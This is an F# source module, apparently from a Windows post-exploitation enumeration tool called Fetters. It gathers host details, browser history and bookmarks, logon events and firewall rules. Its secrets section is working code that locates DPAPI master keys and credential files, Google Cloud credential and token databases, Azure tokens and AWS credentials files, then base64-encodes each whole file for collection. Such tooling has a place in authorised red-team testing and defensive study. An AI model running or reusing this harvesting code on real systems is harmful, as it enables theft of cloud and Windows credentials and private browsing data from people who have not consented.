﻿//Licensed to the Apache Software Foundation (ASF) under one
//or more contributor license agreements.  See the NOTICE file
//distributed with this work for additional information
//regarding copyright ownership.  The ASF licenses this file
//to you under the Apache License, Version 2.0 (the
//"License"); you may not use this file except in compliance
//with the License.  You may obtain a copy of the License at

//  http://www.apache.org/licenses/LICENSE-2.0

//Unless required by applicable law or agreed to in writing,
//software distributed under the License is distributed on an
//"AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
//KIND, either express or implied.  See the License for the
//specific language governing permissions and limitations
//under the License.

module Fetters.DotNet.Provider

    open System
    open System.Net
    open System.Text
    open Fetters.Lists
    open Fetters.DomainTypes
    open Fetters.DotNet.Common
    

    let getBasicInfo () =
        let currentUser = 
            {username = Environment.UserName
             cwd = Environment.CurrentDirectory
             isHighIntegrity = isHighIntegrity ()
             isLocalAdmin = isLocalAdmin ()
            }
        
        let rKey = getRegistryKey HKEY_LOCAL_MACHINE "Software\\Microsoft\\Windows NT\\CurrentVersion" |> Option.get
        let windowsDetails = 
            {productName = getRegistryValue "ProductName" rKey
             releaseId = getRegistryValue "ReleaseId" rKey
             currentBuild = getRegistryValue "CurrentBuild" rKey
             arch = Environment.GetEnvironmentVariable "PROCESSOR_ARCHITECTURE"
             buildBranch = getRegistryValue "BuildBranch" rKey
             currentSession = currentUser
            }
        let pc = {hostname = (NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName + "\\" + Dns.GetHostName())
                  processorCount = Environment.ProcessorCount}
        windowsDetails |> FettersSpecialRecord.WindowsDetails, pc |> FettersSpecialRecord.PC

    //////////////////////////
    //Browser Data Enumeration
    //////////////////////////

    let private extractChromeHistory (path: string) : ChromeHistory =
        let cPath = path + "\\" + "AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
        match fileExistsAtLocation cPath with
        |true ->
            let rgx = createMatchRegex @"(http|ftp|https|file)://([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-]\s)?"
            let res = yieldLineSequence cPath  |> Seq.map (matchStringRegex rgx) |> Seq.toList |> List.filter(fun l -> not(l = ""))
            {path = path; url = res}
        |false -> {path = ""; url = []}


    let private extractChromeBookmarks (path: string) : ChromeBookmark list =
        let cPath = path + "\\" + "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks"
        match fileExistsAtLocation cPath with
        |true ->
            let bookmarks = ChromeBookmarkJ.Parse(yieldWholeFile cPath)
            bookmarks.Roots.BookmarkBar.Children 
            |> Array.map(fun b -> {name = b.Name; url = b.Url})
            |> Array.toList
        |false -> []


    let triageChrome (path: string) : FettersFilesystemRecord =
        //Fed by a collection of user paths
        let b = extractChromeBookmarks path
        let h = extractChromeHistory path
        {bookmarks = b; history = h} |> FettersFilesystemRecord.ChromeInfo
        
    
    let private getFirefoxProfiles (path: string) =
        //Because multiple Firefox profiles could reside in one user directory,
        //this is implemented differently than the Chrome enumeration.
        let cPath = path + "\\" + "AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
        match dirExistsAtLocation cPath with
        |true -> listChildDirectories cPath 
                 |> Array.map (fun d -> d + "\\places.sqlite")
                 |> Array.filter(fun d -> fileExistsAtLocation d)
        |false -> [||]


    let private extractFirefoxHistory (path: string) : FirefoxHistory =
        match fileExistsAtLocation path with //Leaving the check because whatever
        |true ->
            let rgx = createMatchRegex @"(http|ftp|https|file)://([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-]\s)?"
            let res = yieldLineSequence path  |> Seq.map (matchStringRegex rgx) |> Seq.toList |> List.filter(fun l -> not(l = ""))
            {path = path; url = res}
        |false -> {path = ""; url = []}

    let triageFirefox path : FettersFilesystemRecord =
        let fpath = getFirefoxProfiles path |> Array.map extractFirefoxHistory |> Array.toList
        {history = fpath} |> FettersFilesystemRecord.FirefoxInfo

    ///////////////////
    //Event Enumeration
    ///////////////////

    let getEventLog4624 (week: DateTime) (now: DateTime) : FettersSpecialRecord list =
        let query = 
            sprintf "*[System/EventID=4624] and *[System[TimeCreated[@SystemTime >= '%s']]] and *[System[TimeCreated[@SystemTime <= '%s']]]" 
                (week.ToUniversalTime().ToString("o")) 
                (now.ToUniversalTime().ToString("o"))
        
        createEventQuery "Security" query 
        |> createEventLogReader
        |> extractEventLogs
        |> Seq.filter(fun f -> not((snd f).[8] = "7")) // Don't really care about unlock events
        |> Seq.map(fun ev -> 
            let tstamp, e = ev
            {eventId = 4624us 
             timeStamp = tstamp
             subjectSID = e.[0]  
             subjectUsername = e.[1] 
             subjectDomainname = e.[2] 
             subjectLogonId = e.[3] 
             targetUserSID = e.[4] 
             targetUsername = e.[5] 
             targetDomainname = e.[6] 
             logonType = e.[8] 
             workstationName = e.[11]
             processName = e.[17]
             ipAddress = e.[18] 
             } |> FettersSpecialRecord.Event4624)
        |> Seq.toList
        
    let getEventLog4648 (week: DateTime) (now: DateTime) : FettersSpecialRecord list = 
        let query = 
            sprintf "*[System/EventID=4648] and *[System[TimeCreated[@SystemTime >= '%s']]] and *[System[TimeCreated[@SystemTime <= '%s']]]" 
                (week.ToUniversalTime().ToString("o")) 
                (now.ToUniversalTime().ToString("o"))
        
        createEventQuery "Security" query 
        |> createEventLogReader 
        |> extractEventLogs
        |> Seq.map(fun ev -> 
            let tstamp, e = ev
            {eventId = 4648us 
             timeStamp = tstamp
             subjectSID = e.[0]  
             subjectUsername = e.[1] 
             subjectDomainname = e.[2] 
             subjectLogonId = e.[3] 
             targetUsername = e.[5] 
             targetDomainname = e.[6] 
             targetServername = e.[7]
             processName = e.[10]
             ipAddress = e.[11] 
            } |> FettersSpecialRecord.Event4648)
        |> Seq.toList

    ///////////////////////////
    //Firewall Rule Enumeration
    ///////////////////////////

    let private retrieveFirewallRules (onlyDeny: bool) : FirewallRule list  =
        let rawRules = getRawRules ()
        
        let filteredRules = 
            match onlyDeny with
            |true -> denyOnlyFilter rawRules
            |false -> allowFilter rawRules
        
        filteredRules
        |> List.map(fun fR -> 
            let pList = firewallPropertyNames |> List.map (getFirewallAttr fR)
            {name = pList.[0]
             description = pList.[1]
             protocol = pList.[2]
             applicationName = pList.[3]
             localAddresses = pList.[4]
             localPorts = pList.[5]
             remoteAddresses = pList.[6]
             remotePorts = pList.[7]
             direction = pList.[8]
             profiles = pList.[9]
            })


    let getFirewallRules denyOnly : FettersSpecialRecord = 
        match denyOnly with
        |true -> {profile = createFirewallObj() |> getFProfileProperty |> string
                  rules = retrieveFirewallRules true} |> FettersSpecialRecord.Firewall
        |false -> {profile = createFirewallObj() |> getFProfileProperty |> string
                   rules = retrieveFirewallRules false} |> FettersSpecialRecord.Firewall

    /////////////////////
    //Secrets Enumeration
    /////////////////////

    let getDPAPIMasterKeys userFolders : FettersFilesystemRecord list =
        userFolders
        |> Array.map (sprintf "%s\\AppData\\Roaming\\Microsoft\\Protect\\") 
        |> Array.filter dirExistsAtLocation
        |> Array.map listChildDirectories
        |> Array.concat
        |> Array.map listChildFiles
        |> Array.concat
        |> Array.filter(fun f -> 
            let r = f.Split '\\'
            not(r |> Array.last = "Preferred"))
        |> Array.map(fun d ->
            let token = d.Split('\\')
            let sid = token.[token.Length-2]
            {userSID = sid; encodedBlob = encodeEntireFileB64 d}
            |> Credential.DPAPIMasterKey |> FettersFilesystemRecord.Credential)
        |> Array.toList

        
    let getDPAPICredFiles userFolders : FettersFilesystemRecord list =
        userFolders
        |> Array.map (sprintf "%s\\AppData\\Local\\Microsoft\\Credentials\\")
        |> Array.filter dirExistsAtLocation
        |> Array.map listChildFiles
        |> Array.concat
        |> Array.map(fun p -> 
            let mguid = new Guid(getByteSection 36L 16 p)
            let strlen = BitConverter.ToInt32((getByteSection 56L 4 p), 0)
            let credtype = Encoding.Unicode.GetString(getByteSection 60L (strlen - 6) p)
            {path = p; description = credtype; encodedBlob = encodeEntireFileB64 p } 
            |> Credential.DPAPICredFile |> FettersFilesystemRecord.Credential)
        |> Array.toList


    let detectRDCManFile userFolders : string list =
        userFolders
        |> Array.map (sprintf "%s\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings")
        |> Array.filter fileExistsAtLocation
        |> Array.map (sprintf "Remote Desktop Manager connection file exists at %s")
        |> Array.toList


    let getGoogleCloudCreds userFolders : FettersFilesystemRecord list =
        userFolders
        |> Array.map (sprintf "%s\\AppData\\Roaming\\gcloud\\credentials.db")
        |> Array.filter fileExistsAtLocation
        |> Array.map(fun f -> 
            {GoogleCredential.path = f; encodedFile = encodeEntireFileB64 f}
            |> Credential.GoogleCredential |> FettersFilesystemRecord.Credential)
        |> Array.toList


    let getGoogleCloudCredsL userFolders : FettersFilesystemRecord list =
        userFolders
        |> Array.map (sprintf "%s\\AppData\\Roaming\\gcloud\\legacy_credentials.db")
        |> Array.filter fileExistsAtLocation
        |> Array.map(fun f -> 
            {GoogleCredential.path = f; encodedFile = encodeEntireFileB64 f}
            |> Credential.GoogleCredential |> FettersFilesystemRecord.Credential)
        |> Array.toList
    
    
    let getGoogleAccessTokens userFolders : FettersFilesystemRecord list =
        userFolders
        |> Array.map (sprintf "%s\\AppData\\Roaming\\gcloud\\access_tokens.db")
        |> Array.filter fileExistsAtLocation
        |> Array.map(fun f -> 
            {GoogleCredential.path = f; encodedFile = encodeEntireFileB64 f}
            |> Credential.GoogleCredential |> FettersFilesystemRecord.Credential)
        |> Array.toList

    
    let getAzureTokens userFolders : FettersFilesystemRecord list =
        userFolders
        |> Array.map (sprintf "%s\\.azure\\accessTokens.json")
        |> Array.filter fileExistsAtLocation
        |> Array.map(fun f -> 
            {AzureCredential.path = f; encodedFile = encodeEntireFileB64 f}
            |> Credential.AzureCredential |> FettersFilesystemRecord.Credential)
        |> Array.toList


    let getAzureProfile userFolders : FettersFilesystemRecord list =
        userFolders
        |> Array.map (sprintf "%s\\.azure\\accessProfile.json")
        |> Array.filter fileExistsAtLocation
        |> Array.map(fun f -> 
            {AzureCredential.path = f; encodedFile = encodeEntireFileB64 f}
            |> Credential.AzureCredential |> FettersFilesystemRecord.Credential)
        |> Array.toList


    let getAWSCreds userFolders : FettersFilesystemRecord list =
        userFolders
        |> Array.map (sprintf "%s\\.aws\\credentials")
        |> Array.filter fileExistsAtLocation
        |> Array.map(fun f -> 
            {AWSCredential.path = f; encodedFile = encodeEntireFileB64 f}
            |> Credential.AWSCredential |> FettersFilesystemRecord.Credential)
        |> Array.toList


    let getSystemEnvVariables () : FettersSpecialRecord list =
        let evDict = Environment.GetEnvironmentVariables(EnvironmentVariableTarget.Machine)
        [for key in evDict.Keys do
            {environmentKey = unbox<string> key; environmentVal = unbox<string> evDict.[key]}
            |> FettersSpecialRecord.EnvironmentVar]


    let getUserEnvVariables () : FettersSpecialRecord list =
        let evDict = Environment.GetEnvironmentVariables(EnvironmentVariableTarget.User)
        [for key in evDict.Keys do
            {environmentKey = unbox<string> key; environmentVal = unbox<string> evDict.[key]}
            |> FettersSpecialRecord.EnvironmentVar]